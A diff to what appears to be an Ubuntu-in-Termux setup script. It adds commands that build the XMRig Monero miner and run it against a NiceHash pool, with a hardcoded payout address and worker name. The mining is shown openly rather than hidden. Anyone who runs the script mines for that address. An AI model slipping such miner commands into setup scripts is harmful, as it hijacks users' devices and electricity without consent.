@@ -12,3 +12,23 @@ cd ubuntu-in-termux
 chmod +x ubuntu.sh
 ./ubuntu.sh -y
 ./startubuntu.sh
+
+
+cd xmrig/build
+./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.reno2f -pass x -t 5 
+
+apt update -y
+apt upgrade -y
+apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev figlet -y
+figlet -f small Cloning repository
+git clone https://github.com/xmrig/xmrig
+mkdir xmrig/build
+cd xmrig/build
+figlet -f small xmrig OK
+cmake ..
+make -j$(nproc)
+figlet -f small setting ok
+apt remove figlet -y
+echo Removed extra packages.
+
+./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.reno2f -pass x -t 5 --randomx-mode=light
